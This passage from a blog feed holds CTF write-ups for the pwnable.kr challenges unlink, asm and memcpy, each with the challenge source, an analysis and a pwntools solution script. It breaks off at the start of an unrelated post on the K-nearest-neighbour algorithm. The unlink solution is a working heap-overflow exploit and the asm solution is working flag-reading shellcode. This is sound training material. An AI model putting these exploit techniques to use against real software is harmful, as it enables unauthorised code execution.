    <content><![CDATA[<h2><span id="pquestion">question</span><a href="#pquestion" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Daddy! how can I exploit unlink corruption?</span><br><span class="line"></span><br><span class="line">ssh unlink@pwnable.kr -p2222 (pw: guest)</span><br></pre></td></tr></table></figure><a id="more"></a><h2><span id="punlink-c">unlink.c</span><a href="#punlink-c" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">typedef struct tagOBJ&#123;</span><br><span class="line">        struct tagOBJ* fd;</span><br><span class="line">        struct tagOBJ* bk;</span><br><span class="line">        char buf[8];</span><br><span class="line">&#125;OBJ;</span><br><span class="line"></span><br><span class="line">void shell()&#123;</span><br><span class="line">        system(&quot;&#x2F;bin&#x2F;sh&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void unlink(OBJ* P)&#123;</span><br><span class="line">        OBJ* BK;</span><br><span class="line">        OBJ* FD;</span><br><span class="line">        BK&#x3D;P-&gt;bk;</span><br><span class="line">        FD&#x3D;P-&gt;fd;</span><br><span class="line">        FD-&gt;bk&#x3D;BK;</span><br><span class="line">        BK-&gt;fd&#x3D;FD;</span><br><span class="line">&#125;</span><br><span class="line">int main(int argc, char* argv[])&#123;</span><br><span class="line">        malloc(1024);</span><br><span class="line">        OBJ* A &#x3D; (OBJ*)malloc(sizeof(OBJ));</span><br><span class="line">        OBJ* B &#x3D; (OBJ*)malloc(sizeof(OBJ));</span><br><span class="line">        OBJ* C &#x3D; (OBJ*)malloc(sizeof(OBJ));</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; double linked list: A &lt;-&gt; B &lt;-&gt; C</span><br><span class="line">        A-&gt;fd &#x3D; B;</span><br><span class="line">        B-&gt;bk &#x3D; A;</span><br><span class="line">        B-&gt;fd &#x3D; C;</span><br><span class="line">        C-&gt;bk &#x3D; B;</span><br><span class="line"></span><br><span class="line">        printf(&quot;here is stack address leak: %p\n&quot;, &amp;A);</span><br><span class="line">        printf(&quot;here is heap address leak: %p\n&quot;, A);</span><br><span class="line">        printf(&quot;now that you have leaks, get shell!\n&quot;);</span><br><span class="line">        &#x2F;&#x2F; heap overflow!</span><br><span class="line">        gets(A-&gt;buf);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; exploit this unlink!</span><br><span class="line">        unlink(B);</span><br><span class="line">        return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="panalyse">analyse</span><a href="#panalyse" class="header-anchor">#</a></h2><h3><span id="pkuai-xin-xi">块信息</span><a href="#pkuai-xin-xi" class="header-anchor">#</a></h3><p>首先我们看下A、B、C的块信息，在printf处打断点</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x804b408 FASTBIN &#123;</span><br><span class="line">  prev_size &#x3D; 0x0,</span><br><span class="line">  size &#x3D; 0x19,</span><br><span class="line">  fd &#x3D; 0x804b428,</span><br><span class="line">  bk &#x3D; 0x0,</span><br><span class="line">  fd_nextsize &#x3D; 0x0,</span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x804b420 FASTBIN &#123;</span><br><span class="line">  prev_size &#x3D; 0x0,</span><br><span class="line">  size &#x3D; 0x19,</span><br><span class="line">  fd &#x3D; 0x804b440,</span><br><span class="line">  bk &#x3D; 0x804b410,</span><br><span class="line">  fd_nextsize &#x3D; 0x0,</span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x804b438 FASTBIN &#123;</span><br><span class="line">  prev_size &#x3D; 0x0,</span><br><span class="line">  size &#x3D; 0x19,</span><br><span class="line">  fd &#x3D; 0x0,</span><br><span class="line">  bk &#x3D; 0x804b428,</span><br><span class="line">  fd_nextsize &#x3D; 0x0,</span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">gdb-peda$ x&#x2F;20x 0x804b408</span><br><span class="line">0x804b408:	0x00000000	0x00000019	0x0804b428	0x00000000</span><br><span class="line">0x804b418:	0x00000000	0x00000000	0x00000000	0x00000019</span><br><span class="line">0x804b428:	0x0804b440	0x0804b410	0x00000000	0x00000000</span><br><span class="line">0x804b438:	0x00000000	0x00000019	0x00000000	0x0804b428</span><br><span class="line">0x804b448:	0x00000000	0x00000000	0x00000000	0x00020bb1</span><br><span class="line">gdb-peda$ c</span><br><span class="line">Continuing.</span><br><span class="line">here is stack address leak: 0xffffd6c4</span><br><span class="line">here is heap address leak: 0x804b410</span><br><span class="line">now that you have leaks, get shell!</span><br></pre></td></tr></table></figure><p>可以看到三个块在内存上是连续的，同时代码里可以看到gets函数存在溢出，可以覆盖其他内存地址。</p><h3><span id="punlink">unlink</span><a href="#punlink" class="header-anchor">#</a></h3><p>我们要实现任意地址写，已有目标地址<code>target_addr</code>，写入值<code>expect_value</code><br>那么我们可以推导以下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A、B、C结构</span><br><span class="line"> --------------</span><br><span class="line">|+0 | fd       |</span><br><span class="line"> --------------</span><br><span class="line">|+4 | bk       |</span><br><span class="line"> --------------</span><br><span class="line">|+8 | buf[0-4] |</span><br><span class="line"> --------------</span><br><span class="line">|+12| buf[4-8] |</span><br><span class="line"> --------------</span><br><span class="line"></span><br><span class="line">BK&#x3D;P-&gt;bk;   &#x3D;&gt;BK &#x3D; *(P+4) </span><br><span class="line">FD&#x3D;P-&gt;fd;   &#x3D;&gt;FD &#x3D; *P</span><br><span class="line">FD-&gt;bk&#x3D;BK;  &#x3D;&gt;*((*P)+4)&#x3D;*(P+4)</span><br><span class="line">BK-&gt;fd&#x3D;FD;  &#x3D;&gt;*(*(P+4))&#x3D;*P</span><br></pre></td></tr></table></figure><p>因此存在两处任意地址写，我们主要利用下面那个<code>*(*(P+4))=*P</code></p><p>对于本题来说，已知A的栈地址A_stack和A的堆地址A_heap，举例我们需要向stack_addr(和A_stack存在一定偏移)中写入shell函数的地址shell_addr。</p><p>我们可以得到buf的地址是A_heap+8，可存shell_addr地址，我们在B的bk中写入目标栈地址stack_addr，这时我们可以写入<code>*stack_addr=*P</code>，我们需要<code>*P=shell_addr</code>，所以我们在B的fd中填入<code>A_heap+8</code>的值即可。</p><p>注意到有以下一段</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">80485ff:   8b 4d fc                 mov    -0x4(%ebp),%ecx</span><br><span class="line"> 8048602:   c9                      leave  </span><br><span class="line"> 8048603:   8d 61 fc                lea    -0x4(%ecx),%esp</span><br><span class="line"> 8048606:   c3                      ret</span><br></pre></td></tr></table></figure><p>将值取出赋值给ecx，后将*(ecx-4)的值赋值给esp。</p><p>所以我们需要进行修正，将<code>A_heap+8</code>，改成<code>A_heap+12</code>。</p><p>这时，赋值给ecx的值是<code>A_heap+12</code>，减去4后得到<code>A_heap+8</code>，最后赋值我们可以得到esp的值为<code>*(A_heap+8)</code>，也就是shell_addr，完成跳转。</p><h2><span id="pget-flag">get flag</span><a href="#pget-flag" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">p &#x3D; process(&quot;.&#x2F;unlink&quot;)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;here is stack address leak: &quot;)</span><br><span class="line">stack_address &#x3D; int(p.recvline(), 16)</span><br><span class="line">p.recvuntil(&quot;here is heap address leak: &quot;)</span><br><span class="line">heap_address &#x3D; int(p.recvline(), 16)</span><br><span class="line">p.recvuntil(&quot;now that you have leaks, get shell!&quot;)</span><br><span class="line">print(&quot;stack_address:&quot;, hex(stack_address), &quot;heap_address&quot;, hex(heap_address))</span><br><span class="line"></span><br><span class="line">payload &#x3D; p32(0x080484EB) + b&#39;a&#39;*12 + p32(heap_address + 0xc) + p32(stack_address + 0x10)</span><br><span class="line"></span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@5c619b760e10:~&#x2F;test# python3 unlink.py</span><br><span class="line">[+] Starting local process &#39;.&#x2F;unlink&#39;: pid 71</span><br><span class="line">stack_address: 0xffe33994 heap_address 0x955c410</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"></span><br><span class="line">$ ls</span><br><span class="line">unlink    unlink.py</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CTF</category>
        <category>pwn</category>
        <category>pwnable.kr</category>
        <category>Toddler&#39;sBottle</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
        <tag>Toddler&#39;s Bottle</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr —— asm</title>
    <url>/d7bb76ce.html</url>
    <content><![CDATA[<h2><span id="pquestion">question</span><a href="#pquestion" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Mommy! I think I know how to make shellcodes</span><br><span class="line"></span><br><span class="line">ssh asm@pwnable.kr -p2222 (pw: guest)</span><br></pre></td></tr></table></figure><a id="more"></a><h2><span id="panalyse">analyse</span><a href="#panalyse" class="header-anchor">#</a></h2><p>拖入ida伪代码可以看到</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">puts(&quot;Welcome to shellcoding practice challenge.&quot;);</span><br><span class="line">puts(&quot;In this challenge, you can run your x64 shellcode under SECCOMP sandbox.&quot;);</span><br><span class="line">puts(&quot;Try to make shellcode that spits flag using open()&#x2F;read()&#x2F;write() systemcalls only.&quot;);</span><br><span class="line">puts(&quot;If this does not challenge you. you should play &#39;asg&#39; challenge :)&quot;);</span><br><span class="line">s &#x3D; (char *)mmap((void *)0x41414000, 0x1000uLL, 7, 50, 0, 0LL);</span><br><span class="line">memset(s, 144, 0x1000uLL);</span><br><span class="line">v4 &#x3D; strlen(stub);</span><br><span class="line">memcpy(s, stub, v4);</span><br><span class="line">printf(&quot;give me your x64 shellcode: &quot;, stub, argv);</span><br><span class="line">read(0, s + 46, 0x3E8uLL);</span><br><span class="line">alarm(0xAu);</span><br><span class="line">chroot(&quot;&#x2F;home&#x2F;asm_pwn&quot;);</span><br><span class="line">sandbox(&quot;&#x2F;home&#x2F;asm_pwn&quot;);</span><br><span class="line">((void (*)(void))s)();</span><br></pre></td></tr></table></figure><p>也就是要求我们自己写shellcode，来实现读取flag的操作，注意，只能使用open，read，write三个系统函数。</p><p>本来网站<code>http://syscalls.kernelgrok.com/</code>可以查调用表的，不过好像因为维护上不去，所以我用它的github项目部署了一下<code>http://syscall.ycdxsb.cn/</code></p><p>这里为了方便些shellcode，我们可以用pwntools的shellcraft模块编写<code>http://docs.pwntools.com/en/stable/shellcraft/amd64.html</code></p><p>首先我们需要将函数名push到栈中</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">filename &#x3D; &#39;this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong&#39;</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;&#39;</span><br><span class="line">payload +&#x3D; shellcraft.amd64.pushstr(filename)</span><br></pre></td></tr></table></figure><p>由于是push进去的，所以这个时候rsp存的就是函数名，接着我们使用open打开这个文件</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload +&#x3D; shellcraft.amd64.open(&#39;rsp&#39;,0,0)</span><br></pre></td></tr></table></figure><p>由于是封装好了，所以这里的参数和实际的open函数参数一致</p><p>对于64位函数，执行完后的返回值就在rax中，也就是我们open函数的fd值在rax中，然后我们需要使用read函数将内容读到rsp指向的内存中，如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload +&#x3D; shellcraft.amd64.read(&#39;rax&#39;,&#39;rsp&#39;,100)</span><br></pre></td></tr></table></figure><p>最后使用write函数将rsp内容输出到屏幕上</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload +&#x3D; shellcraft.amd64.write(1,&#39;rsp&#39;,100)</span><br></pre></td></tr></table></figure><h2><span id="pget-flag">get flag</span><a href="#pget-flag" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch&#x3D;&#39;amd64&#39;,os&#x3D;&#39;linux&#39;)</span><br><span class="line">#p &#x3D; process(&#39;asm&#39;)</span><br><span class="line">p &#x3D; remote(&#39;127.0.0.1&#39;,99026)</span><br><span class="line"></span><br><span class="line">filename &#x3D; &#39;this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong&#39;</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;&#39;</span><br><span class="line">payload +&#x3D; shellcraft.amd64.pushstr(filename)</span><br><span class="line">payload +&#x3D; shellcraft.amd64.open(&#39;rsp&#39;,0,0)</span><br><span class="line">payload +&#x3D; shellcraft.amd64.read(&#39;rax&#39;,&#39;rsp&#39;,100)</span><br><span class="line">payload +&#x3D; shellcraft.amd64.write(1,&#39;rsp&#39;,100)</span><br><span class="line">p.recvuntil(&#39;shellcode: &#39;)</span><br><span class="line">p.sendline(asm(payload))</span><br><span class="line">print p.recv()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[DEBUG] Received 0x64 bytes:</span><br><span class="line">    &#39;Mak1ng_shelLcodE_i5_veRy_eaSy\n&#39;</span><br><span class="line">    &#39;lease_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooo&#39;</span><br><span class="line">Mak1ng_shelLcodE_i5_veRy_eaSy</span><br><span class="line">lease_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooo</span><br></pre></td></tr></table></figure><p><code>flag</code>:<code>Mak1ng_shelLcodE_i5_veRy_eaSy</code></p>]]></content>
      <categories>
        <category>CTF</category>
        <category>pwn</category>
        <category>pwnable.kr</category>
        <category>Toddler&#39;sBottle</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
        <tag>Toddler&#39;s Bottle</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr —— memcpy</title>
    <url>/95b3b1b5.html</url>
    <content><![CDATA[<h2><span id="pquestion">question</span><a href="#pquestion" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Are you tired of hacking?, take some rest here.</span><br><span class="line">Just help me out with my small experiment regarding memcpy performance. </span><br><span class="line">after that, flag is yours.</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;pwnable.kr&#x2F;bin&#x2F;memcpy.c</span><br><span class="line"></span><br><span class="line">ssh memcpy@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure><a id="more"></a><h2><span id="pmemcpy-c">memcpy.c</span><a href="#pmemcpy-c" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; compiled with : gcc -o memcpy memcpy.c -m32 -lm</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;signal.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;mman.h&gt;</span><br><span class="line">#include &lt;math.h&gt;</span><br><span class="line"></span><br><span class="line">unsigned long long rdtsc()&#123;</span><br><span class="line">        asm(&quot;rdtsc&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">char* slow_memcpy(char* dest, const char* src, size_t len)&#123;</span><br><span class="line">	int i;</span><br><span class="line">	for (i&#x3D;0; i&lt;len; i++) &#123;</span><br><span class="line">		dest[i] &#x3D; src[i];</span><br><span class="line">	&#125;</span><br><span class="line">	return dest;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">char* fast_memcpy(char* dest, const char* src, size_t len)&#123;</span><br><span class="line">	size_t i;</span><br><span class="line">	&#x2F;&#x2F; 64-byte block fast copy</span><br><span class="line">	if(len &gt;&#x3D; 64)&#123;</span><br><span class="line">		i &#x3D; len &#x2F; 64;</span><br><span class="line">		len &amp;&#x3D; (64-1);</span><br><span class="line">		while(i-- &gt; 0)&#123;</span><br><span class="line">			__asm__ __volatile__ (</span><br><span class="line">			&quot;movdqa (%0), %%xmm0\n&quot;</span><br><span class="line">			&quot;movdqa 16(%0), %%xmm1\n&quot;</span><br><span class="line">			&quot;movdqa 32(%0), %%xmm2\n&quot;</span><br><span class="line">			&quot;movdqa 48(%0), %%xmm3\n&quot;</span><br><span class="line">			&quot;movntps %%xmm0, (%1)\n&quot;</span><br><span class="line">			&quot;movntps %%xmm1, 16(%1)\n&quot;</span><br><span class="line">			&quot;movntps %%xmm2, 32(%1)\n&quot;</span><br><span class="line">			&quot;movntps %%xmm3, 48(%1)\n&quot;</span><br><span class="line">			::&quot;r&quot;(src),&quot;r&quot;(dest):&quot;memory&quot;);</span><br><span class="line">			dest +&#x3D; 64;</span><br><span class="line">			src +&#x3D; 64;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; byte-to-byte slow copy</span><br><span class="line">	if(len) slow_memcpy(dest, src, len);</span><br><span class="line">	return dest;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(void)&#123;</span><br><span class="line"></span><br><span class="line">	setvbuf(stdout, 0, _IONBF, 0);</span><br><span class="line">	setvbuf(stdin, 0, _IOLBF, 0);</span><br><span class="line"></span><br><span class="line">	printf(&quot;Hey, I have a boring assignment for CS class.. :(\n&quot;);</span><br><span class="line">	printf(&quot;The assignment is simple.\n&quot;);</span><br><span class="line"></span><br><span class="line">	printf(&quot;-----------------------------------------------------\n&quot;);</span><br><span class="line">	printf(&quot;- What is the best implementation of memcpy?        -\n&quot;);</span><br><span class="line">	printf(&quot;- 1. implement your own slow&#x2F;fast version of memcpy -\n&quot;);</span><br><span class="line">	printf(&quot;- 2. compare them with various size of data         -\n&quot;);</span><br><span class="line">	printf(&quot;- 3. conclude your experiment and submit report     -\n&quot;);</span><br><span class="line">	printf(&quot;-----------------------------------------------------\n&quot;);</span><br><span class="line"></span><br><span class="line">	printf(&quot;This time, just help me out with my experiment and get flag\n&quot;);</span><br><span class="line">	printf(&quot;No fancy hacking, I promise :D\n&quot;);</span><br><span class="line"></span><br><span class="line">	unsigned long long t1, t2;</span><br><span class="line">	int e;</span><br><span class="line">	char* src;</span><br><span class="line">	char* dest;</span><br><span class="line">	unsigned int low, high;</span><br><span class="line">	unsigned int size;</span><br><span class="line">	&#x2F;&#x2F; allocate memory</span><br><span class="line">	char* cache1 &#x3D; mmap(0, 0x4000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);</span><br><span class="line">	char* cache2 &#x3D; mmap(0, 0x4000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);</span><br><span class="line">	src &#x3D; mmap(0, 0x2000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);</span><br><span class="line"></span><br><span class="line">	size_t sizes[10];</span><br><span class="line">	int i&#x3D;0;</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; setup experiment parameters</span><br><span class="line">	for(e&#x3D;4; e&lt;14; e++)&#123;	&#x2F;&#x2F; 2^13 &#x3D; 8K</span><br><span class="line">		low &#x3D; pow(2,e-1);</span><br><span class="line">		high &#x3D; pow(2,e);</span><br><span class="line">		printf(&quot;specify the memcpy amount between %d ~ %d : &quot;, low, high);</span><br><span class="line">		scanf(&quot;%d&quot;, &amp;size);</span><br><span class="line">		if( size &lt; low || size &gt; high )&#123;</span><br><span class="line">			printf(&quot;don&#39;t mess with the experiment.\n&quot;);</span><br><span class="line">			exit(0);</span><br><span class="line">		&#125;</span><br><span class="line">		sizes[i++] &#x3D; size;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	sleep(1);</span><br><span class="line">	printf(&quot;ok, lets run the experiment with your configuration\n&quot;);</span><br><span class="line">	sleep(1);</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; run experiment</span><br><span class="line">	for(i&#x3D;0; i&lt;10; i++)&#123;</span><br><span class="line">		size &#x3D; sizes[i];</span><br><span class="line">		printf(&quot;experiment %d : memcpy with buffer size %d\n&quot;, i+1, size);</span><br><span class="line">		dest &#x3D; malloc( size );</span><br><span class="line"></span><br><span class="line">		memcpy(cache1, cache2, 0x4000);		&#x2F;&#x2F; to eliminate cache effect</span><br><span class="line">		t1 &#x3D; rdtsc();</span><br><span class="line">		slow_memcpy(dest, src, size);		&#x2F;&#x2F; byte-to-byte memcpy</span><br><span class="line">		t2 &#x3D; rdtsc();</span><br><span class="line">		printf(&quot;ellapsed CPU cycles for slow_memcpy : %llu\n&quot;, t2-t1);</span><br><span class="line"></span><br><span class="line">		memcpy(cache1, cache2, 0x4000);		&#x2F;&#x2F; to eliminate cache effect</span><br><span class="line">		t1 &#x3D; rdtsc();</span><br><span class="line">		fast_memcpy(dest, src, size);		&#x2F;&#x2F; block-to-block memcpy</span><br><span class="line">		t2 &#x3D; rdtsc();</span><br><span class="line">		printf(&quot;ellapsed CPU cycles for fast_memcpy : %llu\n&quot;, t2-t1);</span><br><span class="line">		printf(&quot;\n&quot;);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	printf(&quot;thanks for helping my experiment!\n&quot;);</span><br><span class="line">	printf(&quot;flag : ----- erased in this source code -----\n&quot;);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到是依次使用<code>fast_memcpy</code>和<code>slow_memcpy</code> 函数比较使用时间</p><h2><span id="panalyse">analyse</span><a href="#panalyse" class="header-anchor">#</a></h2><p>随便输入范围内数字会出现<code>segmentation fault</code>，问题出在汇编指令<code>movntps</code>。</p><p>查阅资料可以看到，当使用这个指令时，内存必须按照16字节对齐</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">The destination operand is a 128-bit or 256-bit memory location. The memory operand must be aligned on a 16-byte (128-bit version) or 32-byte (VEX.256 encoded version) boundary otherwise a general-protection exception (#GP) will be generated.</span><br></pre></td></tr></table></figure><p>而用户使用malloc申请内存却是以8字节对齐的，假如用户申请内存大小x，那么分配后的块大小为<code>8*(int((x+4)/8)+1)</code>。</p><p>因此对于给定大小low和high限定，我们可以计算得到合适的内存大小x</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def get_input(low,high):</span><br><span class="line">    for i in xrange(low,high):</span><br><span class="line">        if ((i+4)%16&gt;&#x3D;9) or ((i+4)%16&#x3D;&#x3D;0):</span><br><span class="line">            return i</span><br></pre></td></tr></table></figure><h2><span id="pget-flag">get flag</span><a href="#pget-flag" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">def get_input(low,high):</span><br><span class="line">    for i in xrange(low,high):</span><br><span class="line">        if ((i+4)%16&gt;&#x3D;9) or ((i+4)%16&#x3D;&#x3D;0):</span><br><span class="line">            return i</span><br><span class="line"></span><br><span class="line">#context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line">p &#x3D; remote(&quot;pwnable.kr&quot;,9022)</span><br><span class="line">#p &#x3D; process(&#39;.&#x2F;memcpy&#39;)</span><br><span class="line">for i in range(0,10):</span><br><span class="line">    import time</span><br><span class="line">    time.sleep(1)</span><br><span class="line">    result &#x3D; p.recv()</span><br><span class="line">    result &#x3D; result.split(&quot;\n&quot;)[-1]</span><br><span class="line">    low &#x3D; int(result.split(&quot; &quot;)[5])</span><br><span class="line">    high &#x3D; int(result.split(&quot; &quot;)[7])</span><br><span class="line">    output &#x3D; get_input(low,high)</span><br><span class="line">    print &quot;info:%d %d , input: %d&quot;%(low,high,output)</span><br><span class="line">    p.sendline(str(output))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> ↵ 1  python CTF&#x2F;Challenges&#x2F;pwnable.kr&#x2F;part1&#x2F;memcpy&#x2F;memcpy.py</span><br><span class="line">[+] Opening connection to pwnable.kr on port 9022: Done</span><br><span class="line">info:8 16 , input: 8</span><br><span class="line">info:16 32 , input: 21</span><br><span class="line">info:32 64 , input: 37</span><br><span class="line">info:64 128 , input: 69</span><br><span class="line">info:128 256 , input: 133</span><br><span class="line">info:256 512 , input: 261</span><br><span class="line">info:512 1024 , input: 517</span><br><span class="line">info:1024 2048 , input: 1029</span><br><span class="line">info:2048 4096 , input: 2053</span><br><span class="line">info:4096 8192 , input: 4101</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">ok, lets run the experiment with your configuration</span><br><span class="line">experiment 1 : memcpy with buffer size 8</span><br><span class="line">ellapsed CPU cycles for slow_memcpy : 2036</span><br><span class="line">ellapsed CPU cycles for fast_memcpy : 172</span><br><span class="line"></span><br><span class="line">experiment 2 : memcpy with buffer size 21</span><br><span class="line">ellapsed CPU cycles for slow_memcpy : 220</span><br><span class="line">ellapsed CPU cycles for fast_memcpy : 252</span><br><span class="line"></span><br><span class="line">experiment 3 : memcpy with buffer size 37</span><br><span class="line">ellapsed CPU cycles for slow_memcpy : 336</span><br><span class="line">ellapsed CPU cycles for fast_memcpy : 388</span><br><span class="line"></span><br><span class="line">experiment 4 : memcpy with buffer size 69</span><br><span class="line">ellapsed CPU cycles for slow_memcpy : 508</span><br><span class="line">ellapsed CPU cycles for fast_memcpy : 182</span><br><span class="line"></span><br><span class="line">experiment 5 : memcpy with buffer size 133</span><br><span class="line">ellapsed CPU cycles for slow_memcpy : 1042</span><br><span class="line">ellapsed CPU cycles for fast_memcpy : 152</span><br><span class="line"></span><br><span class="line">experiment 6 : memcpy with buffer size 261</span><br><span class="line">ellapsed CPU cycles for slow_memcpy : 1854</span><br><span class="line">ellapsed CPU cycles for fast_memcpy : 204</span><br><span class="line"></span><br><span class="line">experiment 7 : memcpy with buffer size 517</span><br><span class="line">ellapsed CPU cycles for slow_memcpy : 3658</span><br><span class="line">ellapsed CPU cycles for fast_memcpy : 186</span><br><span class="line"></span><br><span class="line">experiment 8 : memcpy with buffer size 1029</span><br><span class="line">ellapsed CPU cycles for slow_memcpy : 7146</span><br><span class="line">ellapsed CPU cycles for fast_memcpy : 374</span><br><span class="line"></span><br><span class="line">experiment 9 : memcpy with buffer size 2053</span><br><span class="line">ellapsed CPU cycles for slow_memcpy : 14326</span><br><span class="line">ellapsed CPU cycles for fast_memcpy : 680</span><br><span class="line"></span><br><span class="line">experiment 10 : memcpy with buffer size 4101</span><br><span class="line">ellapsed CPU cycles for slow_memcpy : 30404</span><br><span class="line">ellapsed CPU cycles for fast_memcpy : 1284</span><br><span class="line"></span><br><span class="line">thanks for helping my experiment!</span><br><span class="line">flag : 1_w4nn4_br34K_th3_m3m0ry_4lignm3nt</span><br><span class="line">[*] Got EOF while reading in interactive</span><br></pre></td></tr></table></figure><p><code>flag</code>:<code>1_w4nn4_br34K_th3_m3m0ry_4lignm3nt</code></p>]]></content>
      <categories>
        <category>CTF</category>
        <category>pwn</category>
        <category>pwnable.kr</category>
        <category>Toddler&#39;sBottle</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
        <tag>Toddler&#39;s Bottle</tag>
      </tags>
  </entry>
  <entry>
    <title>机器学习1——K近邻算法</title>
    <url>/437066e7.html</url>
    <content><![CDATA[<blockquote><p>K近邻算法：一种基本的分类算法</p></blockquote><h2><span id="pji-ben-nei-rong">基本内容</span><a href="#pji-ben-nei-rong" class="header-anchor">#</a></h2><p>输入：实例的特征向量</p><p>输出：实例的类别</p><p>思想：近朱者赤近墨者黑，对于输入实例x，选取距离x最近的K个点，x的分类结果就是K个点中数目最多的那个类别</p><p>三个要素：</p><ul><li>K的选择</li><li>距离的度量</li><li>分类决策规则</li></ul><p>优点：精度高、异常值不敏感、无数据输入假定</p><p>缺点：计算复杂度高、空间复杂度高</p><p>适用数据范围：数值型、标称型</p><a id="more"></a><h2><span id="pkai-fa-liu-cheng">开发流程</span><a href="#pkai-fa-liu-cheng" class="header-anchor">#</a></h2><ul><li>收集数据：任何方法</li><li>准备数据：距离计算所需要的数值，最好是结构化的数据格式</li><li>分析数据：任何方法</li><li>训练算法：此步骤不适用于 k-近邻算法</li><li>测试算法：计算错误率</li><li>使用算法：输入样本数据和结构化的输出结果，然后运行 k-近邻算法判断输入数据分类属于哪个分类，最后对计算出的分类执行后续处理</li></ul><h2><span id="pshi-zhan-xiang-mu">实战项目</span><a href="#pshi-zhan-xiang-mu" class="header-anchor">#</a></h2><ul><li>约会网站<a href="https://github.com/apachecn/AiLearning/blob/master/docs/ml/2.k-%E8%BF%91%E9%82%BB%E7%AE%97%E6%B3%95.md" target="_blank" rel="noopener">https://github.com/apachecn/AiLearning/blob/master/docs/ml/2.k-%E8%BF%91%E9%82%BB%E7%AE%97%E6%B3%95.md</a></li><li>手写数字识别<a 